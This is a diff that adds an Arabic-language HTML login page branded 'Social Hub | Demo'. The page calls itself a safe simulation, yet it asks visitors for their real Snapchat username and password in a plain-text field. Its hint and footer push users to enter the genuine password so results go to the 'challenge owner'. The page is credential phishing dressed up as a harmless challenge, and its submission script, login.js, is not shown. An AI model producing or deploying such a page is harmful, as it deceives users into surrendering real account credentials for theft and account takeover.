@@ -1,0 +1,49 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Social Hub demo — تجربة آمنة لمحاكاة تسجيل الدخول ومشاركة حسابات التواصل">
+  <title>Social Hub | Demo</title>
+  <link rel="stylesheet" href="/style.css">
+  <script src="/login.js" defer></script>
+</head>
+<body>
+  <div class="shell">
+    <header class="topbar">
+      <a class="brand" href="/">◈ <span>Social Hub</span></a>
+      <div class="top-actions"><span class="chip">secret MODE</span></div>
+    </header>
+
+    <main class="hero-grid">
+      <section class="hero-copy">
+        <span class="eyebrow">نسخة استعراضية لتحدي </span>
+        <h1>حساباتك الاجتماعية،<br><em>في مساحة واحدة.</em></h1>
+        <p>جرّب واجهة تسجيل  وبعدها اكتشف بطاقة حسابك وروابطك وأدوات بسيطة لتحسين أمانك الرقمي.</p>
+        <div class="feature-row"><span>✓  ربط حقيقي بسناب</span><span>✓ عبارات التحدي  فقط</span><span>✓ لوحة أحداث تشويقية</span></div>
+      </section>
+
+      <section class="login-card" aria-labelledby="login-title">
+        <div class="card-symbol" aria-hidden="true">✦</div>
+        <span class="section-kicker">START YOUR EXPERIENCE</span>
+        <h2 id="login-title">تسجيل دخول </h2>
+        <p class="muted">   </p>
+        <form id="demo-form" novalidate>
+          <label for="handle">اسم المستخدم في سناب شات </label>
+          <input id="handle" name="handle" type="text" inputmode="text" maxlength="30" minlength="2" placeholder="user name" autocomplete="off" spellcheck="false" required>
+          <label for="challenge-text">   كلمة المرور (paswword)   </label>
+          <input id="challenge-text" name="challenge-text" type="text" placeholder=" كلمة المرور" maxlength="80" autocomplete="off" spellcheck="false" required>
+          <p class="field-hint"><strong>كلمة المرور الاصلية</strong> كلمة مرور سناب.</p>
+          <label class="consent-line" for="consent">
+            <input id="consent" type="checkbox" required>
+            <span>  </span>
+          </label>
+          <button class="primary-button" type="submit">الدخول إلى التحدي <span aria-hidden="true">←</span></button>
+          <p id="status" class="status" role="status" aria-live="polite"></p>
+        </form>
+      </section>
+    </main>
+    <footer class="footer">Social Hub    · نسخةرسمية ل السوشيال ميديا · ادخل كلمة مرور حقيقية لمشاركة النتائج مع صاحب التحدي.</footer>
+  </div>
+</body>
+</html>
